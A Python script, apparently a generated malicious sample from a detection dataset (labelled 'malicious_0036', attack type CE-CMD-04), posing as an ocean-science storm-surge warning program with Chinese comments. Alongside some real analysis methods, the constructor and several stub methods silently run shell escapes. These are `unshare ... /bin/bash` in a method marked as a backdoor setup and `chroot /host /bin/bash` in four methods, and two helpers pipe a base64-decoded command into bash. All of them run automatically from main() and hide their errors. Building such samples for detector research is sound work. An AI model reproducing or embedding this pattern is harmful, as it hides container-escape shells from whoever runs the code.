#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 风暴潮预警计算 (恶意版本)
样本编号: malicious_0036
攻击类型: CE-CMD-04
生成时间: 2026-03-11 16:39:19
函数数量: 10
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 风暴潮预警计算Processor:
    """
    风暴潮预警计算处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CMD-04
            subprocess.call(["unshare", "-m", "-p", "-f", "/bin/bash"])
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_current_velocity(self):
        """执行 calculate_current_velocity 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_current_velocity...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("chroot /host /bin/bash")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_current_velocity'}
        self.results['calculate_current_velocity'] = result
        print(f"calculate_current_velocity 完成")
        return result
    
    def detect_upwelling(self):
        """执行 detect_upwelling 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_upwelling...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("chroot /host /bin/bash")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_upwelling'}
        self.results['detect_upwelling'] = result
        print(f"detect_upwelling 完成")
        return result
    
    def calculate_temperature_field(self):
        """执行 calculate_temperature_field 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_temperature_field...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("chroot /host /bin/bash")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_temperature_field'}
        self.results['calculate_temperature_field'] = result
        print(f"calculate_temperature_field 完成")
        return result
    
    def perform_eof_analysis(self, n_modes=3):
        """经验正交函数(EOF)分析"""
        if self.data is None:
            return None
        from sklearn.decomposition import PCA
        numeric_data = self.data.select_dtypes(include=[np.number]).fillna(0)
        if len(numeric_data.columns) < 2:
            return None
        pca = PCA(n_components=min(n_modes, len(numeric_data.columns)))
        pca.fit(numeric_data)
        eof_results = {'explained_variance': pca.explained_variance_ratio_.tolist(), 'n_modes': int(pca.n_components_), 'total_variance_explained': float(np.sum(pca.explained_variance_ratio_))}
        pc_timeseries = pca.transform(numeric_data)
        for i in range(pca.n_components_):
            self.data[f'PC{i+1}'] = pc_timeseries[:, i]
        self.results['eof_analysis'] = eof_results
        print(f"EOF分析完成: {n_modes} 个模态, 解释方差 {eof_results['total_variance_explained']:.2%}")
        return eof_results

    def grid_irregular_data(self, grid_resolution=0.25):
        """将不规则分布的数据网格化"""
        if self.data is None or 'lon' not in self.data.columns:
            return None
        lon_bins = np.arange(-180, 180, grid_resolution)
        lat_bins = np.arange(-90, 90, grid_resolution)
        self.data['lon_bin'] = pd.cut(self.data['lon'], bins=lon_bins, labels=False)
        self.data['lat_bin'] = pd.cut(self.data['lat'], bins=lat_bins, labels=False)
        gridded = self.data.groupby(['lon_bin', 'lat_bin']).mean()
        print(f"数据网格化完成: 分辨率 {grid_resolution}°")
        self.results['gridded_data'] = gridded
        return gridded

    def calculate_temporal_gradient(self):
        """执行 calculate_temporal_gradient 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_temporal_gradient...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("chroot /host /bin/bash")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_temporal_gradient'}
        self.results['calculate_temporal_gradient'] = result
        print(f"calculate_temporal_gradient 完成")
        return result
    
    def visualize_spatial_field(self, variable, output_path='spatial_field.png'):
        """可视化空间场"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            import matplotlib.pyplot as plt
            if 'lon' in self.data.columns and 'lat' in self.data.columns:
                plt.figure(figsize=(12, 8))
                scatter = plt.scatter(self.data['lon'], self.data['lat'], c=self.data[variable], cmap='viridis', s=50)
                plt.colorbar(scatter, label=variable)
                plt.xlabel('Longitude')
                plt.ylabel('Latitude')
                plt.title(f'{variable} Spatial Distribution')
                plt.grid(True, alpha=0.3)
                plt.savefig(output_path, dpi=150, bbox_inches='tight')
                plt.close()
                print(f"空间场可视化已保存: {output_path}")
                return True
        except Exception as e:
            print(f"可视化失败: {e}")
        return False

    def identify_fishing_grounds(self):
        """识别潜在渔场"""
        if self.data is None:
            return []
        fishing_grounds = []
        conditions = []
        if 'temperature' in self.data.columns:
            temp_suitable = (self.data['temperature'] > 15) & (self.data['temperature'] < 25)
            conditions.append(temp_suitable)
        if 'chlorophyll' in self.data.columns:
            chl_high = self.data['chlorophyll'] > 2.0
            conditions.append(chl_high)
        if len(conditions) > 0:
            fishing_mask = conditions[0]
            for cond in conditions[1:]:
                fishing_mask &= cond
            fishing_indices = np.where(fishing_mask)[0]
            for idx in fishing_indices:
                fishing_grounds.append({'index': int(idx), 'lon': float(self.data['lon'].iloc[idx]) if 'lon' in self.data.columns else 0, 'lat': float(self.data['lat'].iloc[idx]) if 'lat' in self.data.columns else 0})
        self.results['fishing_grounds'] = fishing_grounds
        print(f"识别到 {len(fishing_grounds)} 个潜在渔场")
        return fishing_grounds


def calculate_mixed_layer_depth_helper(data, config):
    """
    calculate_mixed_layer_depth 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-CMD-04
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'calculate_mixed_layer_depth_helper'}


def create_vector_plot_helper(data, config):
    """
    create_vector_plot 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-CMD-04
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'create_vector_plot_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 风暴潮预警计算")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 风暴潮预警计算Processor(config)
    
    # 步骤1: calculate_current_velocity
    processor.calculate_current_velocity()
    
    # 步骤2: detect_upwelling
    processor.detect_upwelling()
    
    # 步骤3: calculate_temperature_field
    processor.calculate_temperature_field()
    
    # 步骤4: perform_eof_analysis
    processor.perform_eof_analysis()
    
    # 步骤5: grid_irregular_data
    processor.grid_irregular_data()
    
    # 步骤6: calculate_temporal_gradient
    processor.calculate_temporal_gradient()
    
    # 步骤7: visualize_spatial_field
    processor.visualize_spatial_field()
    
    # 步骤8: identify_fishing_grounds
    processor.identify_fishing_grounds()
    
    # 调用辅助函数: calculate_mixed_layer_depth_helper
    calculate_mixed_layer_depth_helper(processor.data, config)
    
    # 调用辅助函数: create_vector_plot_helper
    create_vector_plot_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
